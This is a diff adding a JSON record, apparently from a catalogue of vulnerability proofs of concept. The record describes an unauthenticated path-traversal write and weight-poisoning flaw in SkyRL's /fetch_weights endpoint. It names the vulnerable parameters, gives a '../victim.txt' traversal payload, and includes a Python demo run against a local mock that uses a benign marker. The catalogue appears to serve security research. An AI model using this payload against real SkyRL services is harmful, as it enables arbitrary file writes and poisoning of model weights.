@@ -1,0 +1,27 @@
+{
+  "auth": "无",
+  "cleanup": "`python demos/skyrl-fetch-weights/poc.py --cleanup`；删除 `demos/.work/skyrl-fetch-weights/`；mock 服务随脚本退出停止",
+  "component": "skyrl",
+  "effect": "任意写 marker",
+  "entry": "HTTP GET /fetch_weights",
+  "env": "mock 自带: `python demos/skyrl-fetch-weights/poc.py`；上游 pin: `skyrl/weight_sync/delta/checkpoint.py:257`",
+  "id": "skyrl-fetch-weights",
+  "in_b": false,
+  "in_c": true,
+  "layer": 2,
+  "marker": "INKBLADE-BENIGN-skyrl-fetch-weights",
+  "network": "ClusterIP",
+  "params": "cache_dir, payload_file",
+  "reason": "",
+  "sha256": "736647e2ae583340c32536ab199fca320195f37f23bd11916f9c3d7935dfd6c7",
+  "snippet": "import sys\nfrom pathlib import Path\nsys.path.insert(0, str(Path(__file__).resolve().parents[1]))\nfrom _lib.demo import cli, run_demo\nMARKER = \"INKBLADE-BENIGN-skyrl-fetch-weights\"\nSPEC = {'id': 'skyrl-fetch-weights', 'kind': 'path', 'payload': '../victim.txt'}\ndef demo(args):\n    # target=127.0.0.1:<port>; args.target 默认 127.0.0.1:0\n    result = run_demo(SPEC, target=args.target, marker=args.marker)\n    assert result[\"status\"] == 200\n    assert args.marker in result.get(\"body\", \"\") or result.get(\"marker\") == args.marker\n    print(result[\"status\"], result.get(\"body\", \"\")[:160])\n    return 0",
+  "spec": {
+    "id": "skyrl-fetch-weights",
+    "kind": "path",
+    "payload": "../victim.txt"
+  },
+  "status": "runnable",
+  "title": "SkyRL /fetch_weights payload_files path traversal write + weight poisoning",
+  "upstream": "",
+  "version": "a1e34db"
+}
